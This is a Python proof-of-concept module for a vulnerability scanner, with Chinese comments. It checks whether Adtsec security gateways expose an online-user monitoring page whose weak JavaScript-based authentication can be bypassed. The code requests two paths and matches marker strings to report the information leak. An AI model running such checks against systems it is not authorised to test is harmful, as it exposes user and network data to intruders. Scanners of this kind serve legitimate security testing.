# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'ADTsec_0014'  # 平台漏洞编号，留空
    name = '安达通安全网关 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        SJW74系列安全网关 和 全网行为管理TPN-2G安全网关 在线用户。
        /monitor/onlineuser.html
        Ext.QuickTips.init();
        Ext.form.Field.prototype.msgTarget = null;
        var userFlow,selText,selId,ip,Vlan_id;
        //图片相对应
        var clts=new Array(20);
        clts[0]="其他策略";
        clts[1]="应用控制策略";   
        clts[2]="应用流控策略";
        clts[3]="应用审计策略";
        clts[4]="主机策略";
        clts[5]="网页搜索策略";
        clts[6]="用户流控策略";
        clts[7]="内容过滤策略";
        clts[8]="SSLVPN策略";
        clts[9]="网址库策略";

        因为页面采用的js加载请求服务，对身份进行了简单的验证 ，可以绕过。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '安达通安全网关'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'e58b934b-ebc6-4708-98a7-e30017305739'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/monitor/onlineuser.html'
            code2, head, res, errcode, _ = hh.http(url)
            if 'onlineuser.js' in res:
                code2, head, res, errcode, _ = hh.http(arg + '/monitor/onlineuser.js' )
                if 'var userFlow,selText,selId,ip,Vlan_id' in res and 'URL_LOG_ONLINEUSER' in res and 'sslvpn/ssl_list' in res:
                    #security_warning(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
